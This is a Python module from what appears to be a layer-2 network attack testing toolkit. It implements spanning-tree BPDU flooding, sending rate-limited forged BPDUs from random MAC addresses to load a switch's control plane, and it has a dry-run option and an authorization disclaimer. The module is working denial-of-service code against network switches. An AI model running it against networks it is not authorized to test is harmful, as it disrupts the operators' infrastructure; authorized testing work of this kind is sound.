"""BPDU flooding: send a high rate of configuration BPDUs from many bridge identities.

Each BPDU makes the switch parse and compare the frame against its own spanning-tree
state. A flood keeps that control-plane work busy, so real spanning-tree updates can
be delayed. Every frame here comes from a random unicast source MAC and advertises
a random root ID with the worst priority (61440), so none of them can win the
election. The topology stays the same, and the effect to measure is the load and
the delivered rate.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import sendp

from macabre.attacks.bpdu_spoofing import MAX_PRIORITY, build_bpdu_frame
from macabre.attacks.common import random_mac

MAX_RATE = 5000.0          # frames per second; higher rates are refused
BATCH_SECONDS = 0.1        # frames are sent in batches this long


@dataclass(frozen=True)
class BpduFloodingConfig:
    iface: str                  # attacker interface, on the switch port under test
    rate: float = 500.0         # BPDUs per second
    count: int = 0              # BPDUs to send in total; 0 = run until stopped
    dry_run: bool = False       # build BPDUs but do not send them

    def __post_init__(self) -> None:
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} BPDUs per second.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class BpduFloodingStats:
    frames: int = 0
    status: str = ""


def flood_frames(rng: random.Random, how_many: int) -> list:
    """BPDUs from random source MACs, each advertising a random root at the worst priority."""
    frames = []
    for _ in range(how_many):
        source = random_mac(rng)
        frames.append(build_bpdu_frame(
            source,
            root_priority=MAX_PRIORITY,
            root_mac=random_mac(rng),
            bridge_priority=MAX_PRIORITY,
        ))
    return frames


def run_bpdu_flooding(
    config: BpduFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[BpduFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> BpduFloodingStats:
    """Send BPDUs at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = BpduFloodingStats(
            status=(
                f"Dry run: would send about {config.rate:g} BPDUs per second from random bridge IDs "
                f"with the worst priority. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = BpduFloodingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.frames)
        send(flood_frames(rng, batch), iface=config.iface, verbose=False)
        stats.frames += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
